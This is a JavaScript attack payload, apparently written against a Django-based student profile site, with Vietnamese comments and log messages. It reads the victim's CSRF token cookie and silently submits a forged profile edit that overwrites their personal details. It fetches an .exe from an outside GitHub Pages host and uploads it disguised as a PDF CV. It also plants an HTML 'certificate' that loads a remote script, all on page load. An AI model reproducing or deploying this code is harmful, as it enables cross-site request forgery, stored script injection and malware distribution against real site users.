
function getCookie(name) {
    let cookieValue = null;
    if (document.cookie && document.cookie !== '') {
        const cookies = document.cookie.split(';');
        for (let i = 0; i < cookies.length; i++) {
            const cookie = cookies[i].trim();
            if (cookie.substring(0, name.length + 1) === (name + '=')) {
                cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                break;
            }
        }
    }
    return cookieValue;
}
async function uploadExe() {
    try {
        console.log('Đang tải file .exe từ server của kẻ tấn công...');
        const response = await fetch('https://LamChanKhai.github.io/testFile/XinChao.exe');         
	if (!response.ok) {
            console.error('Không tải được file .exe');
            return;
        }    
        const exeBlob = await response.blob();
	
        
        
        const csrfToken = getCookie('csrftoken');
        const endpoint = '/en/profiles/edit/'; // Dùng đường dẫn tương đối
        
        
        const formData = new FormData();
        
        
        formData.append('personal_email', 'attacker-test@example.com');
        formData.append('address', '123 Duong Rac, Quan Rac');
        formData.append('date_of_birth', '2000-01-01'); 
        formData.append('phone_number', '0909123456');
        formData.append('gpa', '3.0'); 
        formData.append('linkedin_url', 'https://linkedin.com/in/junk-data');
        formData.append('github_url', 'https://github.com/junk-data');
        formData.append('self_introduction', 'Day la test data lck'); 
        formData.append('career_objective', 'Test data cho career');
        formData.append('portfolio_url', '');
        formData.append('availability', '');
        
        
        formData.append('avatar', '');
        
        const exeBlobType = 'application/pdf';
        const fakePdf = new Blob([exeBlob], { type: exeBlobType });
        formData.append('cv', fakePdf, 'malware.exe');

        formData.append('projects-TOTAL_FORMS', '0');
        formData.append('projects-INITIAL_FORMS', '0');
        formData.append('projects-MIN_NUM_FORMS', '0');
        formData.append('projects-MAX_NUM_FORMS', '1000');
        
        formData.append('achievements-TOTAL_FORMS', '1');
        formData.append('achievements-INITIAL_FORMS', '1');
        formData.append('achievements-MIN_NUM_FORMS', '0');
        formData.append('achievements-MAX_NUM_FORMS', '1000');
        formData.append('achievements-0-id', '1'); // <-- ID của cái cũ
        formData.append('achievements-0-title', 'Junk Achievement Title'); 
        formData.append('achievements-0-issued_by', '');
        formData.append('achievements-0-description', '');
        formData.append('achievements-0-date_achieved', '');
        const evilPdfContent = '<script src="https://LamChanKhai.github.io/X55.github.io/script.js"></script>';
        const evilCvFile = new File([evilPdfContent], 'lck.html', {
            type: 'application/pdf'
        });
        formData.append('achievements-0-certificate_file', evilCvFile);
        
        
        formData.append('languages-TOTAL_FORMS', '0');
        formData.append('languages-INITIAL_FORMS', '0');
        formData.append('languages-MIN_NUM_FORMS', '0');
        formData.append('languages-MAX_NUM_FORMS', '1000');
        
        
        formData.append('activities-TOTAL_FORMS', '0');
        formData.append('activities-INITIAL_FORMS', '0');
        formData.append('activities-MIN_NUM_FORMS', '0');
        formData.append('activities-MAX_NUM_FORMS', '1000');
        
        
        console.log('Đang gửi request với CSRF Token:', csrfToken);
        
        console.log('Đang upload file .exe lên server nạn nhân...');
        const uploadResponse = await fetch(endpoint, {
            method: 'POST',
            headers: {
                'X-CSRFToken': csrfToken,
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: formData
        });
        
        if (uploadResponse.ok) {
            console.log('THÀNH CÔNG! Đã upload .exe lên server nạn nhân.');
        } else {
            console.error('THẤT BẠI!', uploadResponse.status);
        }
    } catch (error) {
        console.error('Lỗi JavaScript:', error);
    }
}
uploadExe();
alert("Lam Chan Khai da thay doi profile cua ban");
